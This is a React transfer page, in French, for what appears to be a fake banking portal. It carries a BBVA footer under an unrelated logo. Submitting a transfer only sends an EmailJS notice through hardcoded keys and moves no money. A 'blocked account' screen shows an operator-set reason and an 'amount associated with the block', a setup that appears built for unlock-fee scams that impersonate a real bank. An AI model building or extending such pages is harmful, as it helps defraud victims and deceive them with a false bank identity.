
import React, { useState } from "react";
import emailjs from "@emailjs/browser";
import { useAuth } from "../context/AuthContext";
import {
  ArrowLeft,
  Lock,
  AlertTriangle,
  User,
  Building2,
  Wallet,
  ShieldCheck,
  ArrowRight,
  Loader2,
  CheckCircle2,
} from "lucide-react";

export default function VirementPage({ navigate }) {
  const { currentUser } = useAuth();

  const initialForm = {
    nom: "",
    prenom: "",
    email: "",
    iban: "",
    bic: "",
    montant: "",
    devise: currentUser?.devise || "EUR",
    motif: "",
  };

  const [form, setForm] = useState(initialForm);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [successData, setSuccessData] = useState(null);

  const formatMontant = (montant) =>
    new Intl.NumberFormat("fr-FR", {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    }).format(Number(montant) || 0);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  const inputClass =
    "w-full bg-white border border-gray-300 rounded-xl px-4 py-3.5 text-gray-900 caret-black selection:bg-red-100 outline-none transition focus:border-red-600 focus:ring-2 focus:ring-red-100 placeholder:text-gray-400";

  const labelClass = "block text-sm font-semibold text-gray-700 mb-2";

  const SectionTitle = ({ icon: Icon, children }) => (
    <div className="flex items-center gap-3 mb-5">
      <div className="w-10 h-10 rounded-xl bg-red-50 flex items-center justify-center">
        <Icon size={20} className="text-red-600" />
      </div>
      <h3 className="font-bold text-gray-800">{children}</h3>
    </div>
  );

  const Field = ({
    label,
    name,
    placeholder,
    type = "text",
    autoComplete,
  }) => (
    <div>
      <label htmlFor={name} className={labelClass}>
        {label}
      </label>
      <input
        id={name}
        type={type}
        name={name}
        value={form[name]}
        onChange={handleChange}
        placeholder={placeholder}
        className={inputClass}
        required
        autoComplete={autoComplete}
      />
    </div>
  );

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError("");

    if (
      !form.nom.trim() ||
      !form.prenom.trim() ||
      !form.email.trim() ||
      !form.iban.trim() ||
      !form.bic.trim() ||
      !form.montant ||
      !form.motif.trim()
    ) {
      setError("Veuillez remplir tous les champs obligatoires.");
      return;
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email.trim())) {
      setError("Veuillez saisir une adresse e-mail valide.");
      return;
    }

    if (
      !Number.isFinite(Number(form.montant)) ||
      Number(form.montant) <= 0
    ) {
      setError("Veuillez saisir un montant valide.");
      return;
    }

    if (
      !currentUser?.email ||
      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(currentUser.email)
    ) {
      setError("L'adresse e-mail du titulaire est introuvable.");
      return;
    }

    setLoading(true);

    try {
      const ref = `VIR-${Date.now().toString().slice(-8)}`;
      const dateDemande = new Date().toLocaleString("fr-FR");

      const ibanMasque =
        form.iban.length > 4
          ? "•••• •••• •••• " + form.iban.slice(-4)
          : form.iban;

      const nomComplet = `${form.prenom.trim()} ${form.nom.trim()}`;

      // Nom du titulaire du compte connecté
      const nomExpediteur = [
        currentUser?.prenom,
        currentUser?.nom,
      ]
        .filter(Boolean)
        .join(" ")
        .trim();

      // Variables correspondant au modèle EmailJS
      const templateParams = {
        beneficiaire_email: form.email.trim(),
        email: currentUser.email,

        beneficiaire: nomComplet,
        expediteur: nomExpediteur || "Titulaire du compte",

        montant: `${formatMontant(form.montant)} ${form.devise}`,
        date: dateDemande,
        motif: form.motif.trim(),
        reference: ref,
        iban_masque: ibanMasque,

        statut: "Demande enregistrée — en attente de traitement",
      };

      await emailjs.send(
        "service_k4ziul8",
        "template_ejo6psr",
        templateParams,
        "D7vDC7RcrTFMzROoO"
      );

      setSuccessData({
        ...form,
        reference: ref,
        date: dateDemande,
        ibanMasque,
        expediteur: nomExpediteur || "Titulaire du compte",
      });
    } catch (err) {
      console.error("Erreur EmailJS :", err);
      setError(
        err?.text ||
          err?.message ||
          "Impossible d'envoyer la notification. Vérifiez la configuration EmailJS."
      );
    } finally {
      setLoading(false);
    }
  };

  // ÉCRAN DE CONFIRMATION
  if (successData) {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        <header className="bg-white border-b px-4 py-4">
          <div className="max-w-lg mx-auto flex items-center gap-3">
            <img
              src="/images/L1.jpeg"
              alt="ART"
              className="h-9 w-auto object-contain"
            />
          </div>
        </header>

        <main className="max-w-lg mx-auto w-full px-4 py-10 flex-1">
          <section className="bg-white rounded-2xl border p-6 shadow-sm">
            <div className="w-16 h-16 rounded-full bg-emerald-50 flex items-center justify-center mx-auto mb-5">
              <CheckCircle2 size={36} className="text-emerald-600" />
            </div>

            <h1 className="text-2xl font-bold text-center text-gray-900">
              Demande enregistrée
            </h1>

            <p className="text-center text-gray-600 mt-3">
              Votre demande a été enregistrée avec succès.
            </p>

            <div className="bg-emerald-50 rounded-xl p-5 mt-6 text-center">
              <p className="text-xs font-bold text-emerald-800">
                MONTANT DEMANDÉ
              </p>
              <p className="text-3xl font-bold text-emerald-900 mt-2">
                {formatMontant(successData.montant)} {successData.devise}
              </p>
              <p className="text-sm text-emerald-800 mt-3">
                En attente de traitement
              </p>
            </div>

            <h2 className="font-bold text-gray-900 mt-7 mb-3">
              Informations de la demande
            </h2>

            <dl className="divide-y divide-gray-100 text-sm">
              {[
                ["Émis par", successData.expediteur],
                ["Bénéficiaire", `${successData.prenom} ${successData.nom}`],
                ["Adresse e-mail", successData.email],
                ["IBAN", successData.ibanMasque],
                ["BIC / SWIFT", successData.bic],
                ["Motif", successData.motif],
                ["Date", successData.date],
                ["Référence", successData.reference],
              ].map(([label, value]) => (
                <div
                  key={label}
                  className="py-3 flex justify-between gap-4"
                >
                  <dt className="text-gray-500">{label}</dt>
                  <dd className="text-right font-medium text-gray-900 break-all">
                    {value}
                  </dd>
                </div>
              ))}
            </dl>

            <button
              type="button"
              onClick={() => navigate?.("dashboard")}
              className="w-full mt-7 bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded-full"
            >
              Retour au tableau de bord
            </button>
          </section>
        </main>

        <footer className="text-center py-5 text-xs text-gray-400 border-t bg-white">
          © 2026 — BBVA
        </footer>
      </div>
    );
  }

  // PAGE DU FORMULAIRE
  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <header className="bg-white border-b border-gray-200 px-4 py-4 sticky top-0 z-50">
        <div className="max-w-lg mx-auto flex items-center gap-4">
          <button
            type="button"
            onClick={() => navigate?.("dashboard")}
            className="w-10 h-10 rounded-full flex items-center justify-center hover:bg-gray-100"
            aria-label="Retour au tableau de bord"
          >
            <ArrowLeft size={22} />
          </button>

          <img
            src="/images/L1.jpeg"
            alt="ART"
            className="h-8 w-auto object-contain"
          />

          <div className="ml-auto flex items-center gap-1 text-gray-500 text-xs font-semibold">
            <ShieldCheck size={16} />
            
          </div>
        </div>
      </header>

      <main className="max-w-lg mx-auto w-full px-4 py-8 flex-1">
        <h1 className="text-2xl font-bold text-gray-900">
          Effectuer un virement
        </h1>

        <p className="text-sm text-gray-500 mt-2 mb-7">
          Renseignez les coordonnées du bénéficiaire et les détails de votre
          demande.
        </p>

        {currentUser?.compteBloque ? (
          <div className="bg-white border-2 border-red-500 rounded-2xl p-6 shadow-sm text-center">
            <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-5">
              <Lock size={36} className="text-red-600" />
            </div>

            <h2 className="text-xl font-bold text-red-700 mb-2">
              Virement impossible
            </h2>

            <p className="text-gray-600 text-sm mb-6">
              Le compte est actuellement bloqué. Aucune opération ne peut être
              exécutée.
            </p>

            <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-5 text-left">
              <div className="flex items-start gap-2">
                <AlertTriangle size={17} className="text-red-500 shrink-0" />
                <p className="text-sm text-red-700">
                  {currentUser?.blockReason ||
                    "Veuillez contacter le service client."}
                </p>
              </div>
            </div>

            <div className="bg-gray-50 border rounded-xl p-5 mb-6">
              <p className="text-sm text-gray-600 mb-2">
                Montant associé au blocage
              </p>
              <p className="text-3xl font-bold text-red-600">
                {formatMontant(currentUser?.montantDeblocage)}{" "}
                {currentUser?.devise}
              </p>
            </div>

            <button
              type="button"
              onClick={() => navigate?.("dashboard")}
              className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded-full"
            >
              Retour au tableau de bord
            </button>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="space-y-5">
            <section className="bg-white rounded-2xl p-5 shadow-sm border">
              <SectionTitle icon={User}>
                Informations du bénéficiaire
              </SectionTitle>

              <div className="space-y-4">
                <Field
                  label="Nom"
                  name="nom"
                  placeholder="Nom du bénéficiaire"
                  autoComplete="family-name"
                />

                <Field
                  label="Prénom"
                  name="prenom"
                  placeholder="Prénom du bénéficiaire"
                  autoComplete="given-name"
                />

                <Field
                  label="Adresse e-mail"
                  name="email"
                  type="email"
                  placeholder="exemple@email.com"
                  autoComplete="email"
                />
              </div>
            </section>

            <section className="bg-white rounded-2xl p-5 shadow-sm border">
              <SectionTitle icon={Building2}>
                Coordonnées bancaires
              </SectionTitle>

              <div className="space-y-4">
                <Field
                  label="IBAN du bénéficiaire"
                  name="iban"
                  placeholder="Saisissez l’IBAN"
                />

                <Field
                  label="Code BIC / SWIFT"
                  name="bic"
                  placeholder="Saisissez le code BIC / SWIFT"
                />
              </div>
            </section>

            <section className="bg-white rounded-2xl p-5 shadow-sm border">
              <SectionTitle icon={Wallet}>
                Détails du virement
              </SectionTitle>

              <div className="space-y-4">
                <div>
                  <label htmlFor="montant" className={labelClass}>
                    Montant du virement
                  </label>
                  <input
                    id="montant"
                    type="number"
                    name="montant"
                    value={form.montant}
                    onChange={handleChange}
                    min="0.01"
                    step="0.01"
                    placeholder="0,00"
                    className={inputClass}
                    required
                  />
                </div>

                <div>
                  <label htmlFor="devise" className={labelClass}>
                    Devise
                  </label>
                  <select
                    id="devise"
                    name="devise"
                    value={form.devise}
                    onChange={handleChange}
                    className={inputClass}
                  >
                    <option value="EUR">EUR - Euro</option>
                    <option value="XOF">XOF - Franc CFA</option>
                    <option value="USD">USD - Dollar américain</option>
                  </select>
                </div>

                <div>
                  <label htmlFor="motif" className={labelClass}>
                    Motif du virement
                  </label>
                  <textarea
                    id="motif"
                    name="motif"
                    value={form.motif}
                    onChange={handleChange}
                    placeholder="Indiquez le motif..."
                    rows={4}
                    className={`${inputClass} resize-y`}
                    required
                  />
                </div>
              </div>
            </section>

            <section className="bg-gray-900 rounded-2xl p-5 text-white">
              <p className="text-gray-400 text-sm mb-4">
                Récapitulatif du virement
              </p>

              <div className="flex justify-between items-center">
                <span className="text-gray-300 text-sm">Montant demandé</span>
                <span className="text-2xl font-bold">
                  {formatMontant(form.montant)} {form.devise}
                </span>
              </div>

              <div className="border-t border-gray-700 mt-4 pt-4 flex justify-between text-sm">
                <span className="text-gray-400">Statut</span>
                <span className="text-yellow-400">
                  En attente de traitement
                </span>
              </div>
            </section>

            {error && (
              <div
                role="alert"
                className="bg-red-50 border border-red-200 rounded-xl p-4 flex items-start gap-2 text-red-700 text-sm"
              >
                <AlertTriangle size={18} className="shrink-0 mt-0.5" />
                <span>{error}</span>
              </div>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-red-600 hover:bg-red-700 disabled:opacity-60 text-white font-bold py-4 rounded-full flex items-center justify-center gap-3 shadow-lg transition"
            >
              {loading ? (
                <>
                  <Loader2 size={20} className="animate-spin" />
                  Envoi en cours...
                </>
              ) : (
                <>
                  Envoyer la demande
                  <ArrowRight size={19} />
                </>
              )}
            </button>

            <div className="flex items-center justify-center gap-2 text-gray-400 text-xs pb-4">
              <ShieldCheck size={15} />
              
            </div>
          </form>
        )}
      </main>

      <footer className="text-center py-5 text-xs text-gray-400 border-t bg-white mt-auto">
        © 2026 — BBVA
      </footer>
    </div>
  );
}
